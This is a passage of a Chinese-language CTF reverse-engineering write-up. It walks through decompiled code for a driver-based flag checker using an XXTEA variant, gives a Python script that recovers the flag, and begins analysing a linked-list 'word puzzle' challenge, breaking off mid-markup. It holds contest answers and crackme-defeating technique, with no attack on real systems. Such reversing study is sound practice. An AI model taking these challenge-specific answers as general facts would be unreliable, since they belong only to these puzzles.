class="hljs-number">0xCCCCCCCC</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  j___CheckForDebuggerJustMyCode((__int64)&amp;unk_1400E90A2, (__int64)argv, (__int64)envp);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)dev_open((__int64)v7) )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(ret_str, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>ui64);<br>    v9[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>ui64);<br>    v11 = <span class="hljs-number">0</span>;<br>    v12 = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(&amp;byte_1400C5138);<br>    <span class="hljs-keyword">while</span> ( v11 != <span class="hljs-number">10</span> )<br>    &#123;<br>      v11 = j__fgetchar();<br>      flag[v12++] = v11;<br>    &#125;<br>    dev_check_flag(v7[<span class="hljs-number">0</span>], <span class="hljs-number">0x222000</span>, (<span class="hljs-type">int</span>)flag, <span class="hljs-number">32</span>, ret_str, <span class="hljs-number">0x20</span>u, (LPDWORD)v9);<br>    dev_close(*(_QWORD *)v7);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>);<br>    ((<span class="hljs-type">void</span> (__fastcall *)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *))system)(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;byte_1400C5120);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag的校验逻辑在sys驱动中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kernel_check</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+20h] [rbp-C8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-C0h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+2Ch] [rbp-BCh]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+30h] [rbp-B8h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+34h] [rbp-B4h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+38h] [rbp-B0h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+3Ch] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+40h] [rbp-A8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+44h] [rbp-A4h]</span><br>  PCSTR Format; <span class="hljs-comment">// [rsp+48h] [rbp-A0h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [rsp+50h] [rbp-98h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [rsp+54h] [rbp-94h]</span><br>  _DWORD *v15; <span class="hljs-comment">// [rsp+58h] [rbp-90h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [rsp+60h] [rbp-88h]</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// [rsp+64h] [rbp-84h]</span><br>  PCSTR v18; <span class="hljs-comment">// [rsp+68h] [rbp-80h]</span><br>  <span class="hljs-type">int</span> v19[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-78h] BYREF</span><br>  <span class="hljs-type">int</span> encrypted_flag[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+80h] [rbp-68h] BYREF</span><br>  <span class="hljs-type">char</span> flag[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+A0h] [rbp-48h] BYREF</span><br><br>  v9 = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v15 = (_DWORD *)sub_1400016E0(a2);<br>  v13 = v15[<span class="hljs-number">6</span>];<br>  Format = *(PCSTR *)(a2 + <span class="hljs-number">24</span>);<br>  v11 = v15[<span class="hljs-number">4</span>];<br>  v16 = v15[<span class="hljs-number">2</span>];<br>  v10 = v13;<br>  <span class="hljs-keyword">if</span> ( v13 == <span class="hljs-number">0x222000</span> )<br>  &#123;<br>    DbgPrint(&amp;byte_140001FA0);<br>    v8 = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>    <span class="hljs-built_in">memset</span>(encrypted_flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(encrypted_flag));<br>    v18 = Format;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v11; ++i )<br>      flag[i] = v18[i];<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span> )<br>    &#123;<br>      v4 = <span class="hljs-number">0</span>;<br>      v5 = <span class="hljs-number">0</span>;<br>      v4 = (<span class="hljs-type">unsigned</span> __int8)flag[j] &lt;&lt; <span class="hljs-number">24</span>;<br>      v4 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>      v4 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>      v4 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">3</span>];<br>      v5 = (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">24</span>;<br>      v5 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>      v5 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">6</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>      v5 += (<span class="hljs-type">unsigned</span> __int8)flag[j + <span class="hljs-number">7</span>];<br>      v19[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1234</span>;<br>      v19[<span class="hljs-number">1</span>] = <span class="hljs-number">0x3A4D</span>;<br>      v19[<span class="hljs-number">2</span>] = <span class="hljs-number">0x5E6F</span>;<br>      v19[<span class="hljs-number">3</span>] = <span class="hljs-number">0xAA33</span>;<br>      v17 = <span class="hljs-number">2</span>;<br>      v14 = <span class="hljs-number">33</span>;<br>      xxtea_encrypt(<span class="hljs-number">33</span>i64, &amp;v4, v19);<br>      encrypted_flag[v8] = v4;<br>      encrypted_flag[v8 + <span class="hljs-number">1</span>] = v5;<br>      v8 += <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">8</span>; ++k )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( encrypted_flag[k] == ans[k] )<br>        ++v9;<br>    &#125;<br>    DbgPrint(&amp;byte_140001FB0);<br>    <span class="hljs-keyword">if</span> ( v9 == <span class="hljs-number">8</span> )<br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)Format, <span class="hljs-string">&quot;flag is you input&quot;</span>);<br>      *(_QWORD *)(a2 + <span class="hljs-number">56</span>) = <span class="hljs-number">18</span>i64;<br>      DbgPrint(&amp;byte_140001FE0);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)Format, <span class="hljs-string">&quot;wrong&quot;</span>);<br>      *(_QWORD *)(a2 + <span class="hljs-number">56</span>) = <span class="hljs-number">6</span>i64;<br>      DbgPrint(&amp;byte_140002000);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v10 != <span class="hljs-number">2237440</span> )<br>  &#123;<br>    <span class="hljs-keyword">goto</span> LABEL_19;<br>  &#125;<br>  DbgPrint(aIrpdevicecontr, v11);<br>  DbgPrint(<span class="hljs-string">&quot;CODE_WRITE %X\n&quot;</span>, <span class="hljs-number">2237440</span>i64);<br>  DbgPrint(Format);<br>  *(_QWORD *)(a2 + <span class="hljs-number">56</span>) = <span class="hljs-number">0</span>i64;<br>LABEL_19:<br>  *(_QWORD *)(a2 + <span class="hljs-number">56</span>) = <span class="hljs-number">65</span>i64;<br>  IofCompleteRequest((PIRP)a2, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>xxtea加密，每次加密8个字节，大端序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_140001740</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *a2, __int64 a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-24h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  v5 = *a2;<br>  v6 = a2[<span class="hljs-number">1</span>];<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a1; ++i )<br>  &#123;<br>    v5 += (*(_DWORD *)(a3 + <span class="hljs-number">4</span>i64 * (v4 &amp; <span class="hljs-number">3</span>)) + v4) ^ (v6 + ((v6 &gt;&gt; <span class="hljs-number">6</span>) ^ (<span class="hljs-number">4</span> * v6)));<br>    v4 -= <span class="hljs-number">0x61CEEEEF</span>;<br>    v6 += (*(_DWORD *)(a3 + <span class="hljs-number">4</span>i64 * ((v4 &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>)) + v4) ^ (v5 + ((v5 &gt;&gt; <span class="hljs-number">6</span>) ^ (<span class="hljs-number">8</span> * v5)));<br>  &#125;<br>  *a2 = v5;<br>  result = <span class="hljs-number">4</span>i64;<br>  a2[<span class="hljs-number">1</span>] = v6;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>写对应的xxtea解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br>ans = [<span class="hljs-number">0x8CCAF011</span>, <span class="hljs-number">0x835A03B8</span>, <span class="hljs-number">0x6DCC9BAD</span>, <span class="hljs-number">0xE671FA99</span>, <span class="hljs-number">0xE6011F35</span>, <span class="hljs-number">0xE5A56CC8</span>, <span class="hljs-number">0xD4847CFA</span>, <span class="hljs-number">0x5D8E0B8E</span>]<br><br>key = [<span class="hljs-number">0x1234</span>, <span class="hljs-number">0x3A4D</span>, <span class="hljs-number">0x5E6F</span>, <span class="hljs-number">0xAA33</span>]<br><br><br>flag = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    x = ans[i*<span class="hljs-number">2</span>]<br>    y = ans[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0x100000000</span> - ((<span class="hljs-number">0x61CEEEEF</span> * <span class="hljs-number">33</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):<br>        y = <span class="hljs-number">0x100000000</span> + y - (((key[(<span class="hljs-built_in">sum</span>&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>])+<span class="hljs-built_in">sum</span>)^(x+((x&gt;&gt;<span class="hljs-number">6</span>)^(x&lt;&lt;<span class="hljs-number">3</span>))))<br>        y &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + <span class="hljs-number">0x61CEEEEF</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        x = <span class="hljs-number">0x100000000</span> + x - (((key[<span class="hljs-built_in">sum</span>&amp;<span class="hljs-number">3</span>])+<span class="hljs-built_in">sum</span>)^(y+((y&gt;&gt;<span class="hljs-number">6</span>)^(y&lt;&lt;<span class="hljs-number">2</span>))))<br>        x &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    flag[i*<span class="hljs-number">2</span>] = x<br>    flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>] = y<br><br>flag_s = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    flag_s += f.to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(flag_s)<br></code></pre></td></tr></table></figure><h2 id="文字谜题"><a href="#文字谜题" class="headerlink" title="文字谜题"></a>文字谜题</h2><p>输入字符串后使用<code>parse</code>处理字符串，返回值与<code>l1</code>使用<code>list_eq</code>进行比较，校验通过后计算输入字符串hash得到flag</p><p>分析<code>list_eq</code>发现是两个链表的比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">std</span>::operator&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(_bss_start, <span class="hljs-string">&quot;Enter your magic code: &quot;</span>, envp);<br>vars10 = <span class="hljs-number">0</span>;<br>flag = &amp;vars10;<br>vars8 = <span class="hljs-number">0LL</span>;<br>v3 = <span class="hljs-built_in">std</span>::ios::widen(*(__int64 *)((<span class="hljs-type">char</span> *)&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>[<span class="hljs-number">30</span>] + *(_QWORD *)(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>[<span class="hljs-number">0</span>] - <span class="hljs-number">24</span>)), <span class="hljs-number">10LL</span>);<br><span class="hljs-built_in">std</span>::getline&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, &amp;flag, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3);<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;((<span class="hljs-built_in">std</span>::ostream *)_bss_start);<br>*(_QWORD *)&amp;v4 = parse(&amp;flag);<br>*((_QWORD *)&amp;v4 + <span class="hljs-number">1</span>) = &amp;l1;<br><span class="hljs-keyword">if</span> ( list_eq(v4) &amp;&amp; vars8 == <span class="hljs-number">0x23B</span> )<br>&#123;<br>  SHA256_Init(vars20);<br>  SHA256_Update(vars20, flag, vars8);<br>  v8 = &amp;vars90;<br>  SHA256_Final(&amp;vars90, vars20);<br>  v9 = (<span class="hljs-type">unsigned</span> __int64)<span class="hljs-string">&quot;Congratulations! Your flag is: flag&#123;W0w_U_Ar3_V3ry_G00d_A7_C0unt1n9_&quot;</span>;<br>  <span class="hljs-built_in">std</span>::operator&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(<br>    _bss_start,<br>    <span class="hljs-string">&quot;Congratulations! Your flag is: flag&#123;W0w_U_Ar3_V3ry_G00d_A7_C0unt1n9_&quot;</span>,<br>    v10);<br></code></pre></td></tr></table></figure><p>分析处理输入的<code>parse</code>，只接收<code>ab-</code>3个字符，3个字符分别对应3种处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">parse0</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br><span class="hljs-comment">// a2 = 1</span><br><span class="hljs-comment">// a3 = 0</span><br>  v3 = (<span class="hljs-type">char</span> *)a1;<br>  v4 = a3;<br>LABEL_2:<br>  <span class="hljs-keyword">for</span> ( i = a2; ; i = (i - <span class="hljs-number">1</span>) / <span class="hljs-number">3u</span> )<br>  &#123;<br>    v6 = *v3;<br>    <span class="hljs-keyword">if</span> ( !*v3 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      ++v3;<br>      <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-string">&#x27;a&#x27;</span> )<br>      &#123;<br>        i *= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_2;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-string">&#x27;b&#x27;</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-string">&#x27;-&#x27;</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_18;<br>      v7 = operator new(<span class="hljs-number">0x10</span>uLL);<br>      v8 = v4;<br>      v9 = v7;<br>      v10 = <span class="hljs-number">1LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v8 = *(_QWORD *)(v8 + <span class="hljs-number">8</span>);<br>          v11 = v10++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v8 );<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v11 = <span class="hljs-number">0</span>;<br>      &#125;<br>      a1 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + v11);<br>      v12 = num2ch(a1, a2, v8);<br>      *(_QWORD *)(v9 + <span class="hljs-number">8</span>) = v4;<br>      i = <span class="hljs-number">1</span>;<br>      v4 = v9;<br>      *(_BYTE *)v9 = v12;<br>      v6 = *v3;<br>      <span class="hljs-keyword">if</span> ( !*v3 )<br>        <span class="hljs-keyword">goto</span> LABEL_9;<br>    &#125;<br>    a3 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">3</span> * (i / <span class="hljs-number">3</span>));<br>    <span class="hljs-keyword">if</span> ( i % <span class="hljs-number">3</span> != <span class="hljs-number">1</span> || (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>LABEL_18:<br>      bad_input(a1, a2, a3);<br>  &#125;<br>LABEL_9:<br>  v13 = operator new(<span class="hljs-number">0x10</span>uLL);<br>  v14 = v4;<br>  v15 = v13;<br>  v16 = <span class="hljs-number">1LL</span>;<br>  <span class="hljs-keyword">if</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v14 = *(_QWORD *)(v14 + <span class="hljs-number">8</span>);<br>      v17 = v16++;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v14 );<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v17 = <span class="hljs-number">0</span>;<br>  &#125;<br>  *(_BYTE *)v15 = num2ch((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + v17), a2, v14);<br>  result = v15;<br>  *(_QWORD *)(v15 + <span class="hljs-number">8</span>) = v4;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>关注第一个for循环，初始化<code>i = 1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">LABEL_2:<br>  <span class="hljs-keyword">for</span> ( i = a2; ; i = (i - <span class="hljs-number">1</span>) / <span class="hljs-number">3u</span> )<br></code></pre></td></tr></table></figure><p>依次取出一个字符进行比较，若字符为<code>a</code>，<code>i *= 2</code>，goto进行下一次循环，跳过for循环结尾的<code>i = (i - 1) / 3</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v6 == <span class="hljs-string">&#x27;a&#x27;</span> )<br>&#123;<br>  i *= <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">goto</span> LABEL_2;<br>&#125;<br></code></pre></td></tr></table></figure><p>若字符为<code>b</code>，使用break跳出while循环，需要确保<code>i % 3 == 1</code>和<code>i &amp; 1 == 0</code>，随后执行for循环结尾的<code>i = (i - 1) / 3</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-string">&#x27;b&#x27;</span> )<br>        <span class="hljs-keyword">break</span>;<br>   <span class="hljs-keyword">if</span> ( i % <span class="hljs-number">3</span> != <span class="hljs-number">1</span> || (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>LABEL_18:<br>      bad_input(a1, a2, a3);<br></code></pre></td></tr></table></figure><p>若字符为<code>-</code>，创建一个新的链表节点<code>v9</code>，计算链表长度<code>v11</code>，计算<code>v12 = num2ch(i+v11)</code>，将计算得到的<code>v12</code>储存在节点<code>v9</code>中，并将<code>v9</code>插入到结果链表头部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">v7 = operator new(<span class="hljs-number">0x10</span>uLL);<br>v8 = v4;<br>v9 = v7;<br>v10 = <span class="hljs-number">1LL</span>;<br><span class="hljs-keyword">if</span> ( v4 )<br>&#123;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v8 = *(_QWORD *)(v8 + <span class="hljs-number">8</span>);<br>    v11 = v10++;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v8 );<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  v11 = <span class="hljs-number">0</span>;<br>&#125;<br>a1 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + v11);<br>v12 = num2ch(a1, a2, v8);<br>*(_QWORD *)(v9 + <span class="hljs-number">8</span>) = v4;<br>i = <span class="hljs-number">1</span>;<br>v4 = v9;<br>*(_BYTE *)v9 = v12;<br></code></pre></td></tr></table></figure><p><code>num2ch</code>对输入的字符异或<code>0x8D</code>，并且要求输入字符小于<code>0x100</code>，即为一个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 